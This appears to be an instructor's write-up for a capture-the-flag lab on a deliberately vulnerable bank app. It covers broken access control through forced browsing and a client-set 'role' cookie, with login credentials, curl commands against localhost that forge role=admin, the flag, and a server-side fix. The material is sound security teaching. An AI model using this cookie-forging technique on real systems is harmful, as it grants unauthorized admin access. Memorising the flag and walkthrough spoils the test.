# 02 — Broken Access Control: Forced Browsing + Client-side Role · Hard · 250 pts

**OWASP:** A01:2021 Broken Access Control · **Course ref:** Ch04 ("force-browse to hidden functionality"),
Ch03 / Lab2 content discovery (gobuster / dirb, `robots.txt`).

## Scenario / Briefing (shown to students in-app)
Same bank, bigger prize. Customers use the normal dashboard, but staff have an admin console *somewhere*. It isn't
in your menu — yet "hidden" is not the same as "protected". Between forgotten links and a server that trusts the
*browser* to declare who is an admin, you should be able to walk right in.
**Your objective:** discover the staff-only area and escalate from "user" to "admin" to grab the flag.

## Walkthrough
1. Log in as `ahmed` / `password101`. The dashboard has no admin link.
2. **Content discovery:** `GET /robots.txt` → `Disallow: /admin` (gobuster/dirb with a common wordlist also finds it).
3. `GET /admin` → **403 Staff only … role `user`**. So the server knows your role — from where?
4. DevTools → Application → Cookies: besides `session` (HttpOnly) there is a plain cookie **`role=user`**.
5. Change it to `role=admin` and reload `/admin` → flag.

```bash
curl -c j -d 'username=ahmed&password=password101' http://127.0.0.1:8002/login
curl -b j -b 'role=admin' http://127.0.0.1:8002/admin
```
Flag: `FLAG{broken_access_vertical_esc}`

## The bug
`admin_page()` decides authorization from `self.cookies().get("role")` — a value the client controls
(see `# ======= VULN HERE =======`). Hiding `/admin` from the menu is "security through obscurity", not access control.

## The fix
Keep the role server-side with the session and check it on every request, deny-by-default:
```python
SESSIONS[token] = {"user": "ahmed", "role": "user"}       # set at login, never sent to the client
if SESSIONS.get(token, {}).get("role") != "admin":
    return 403
```
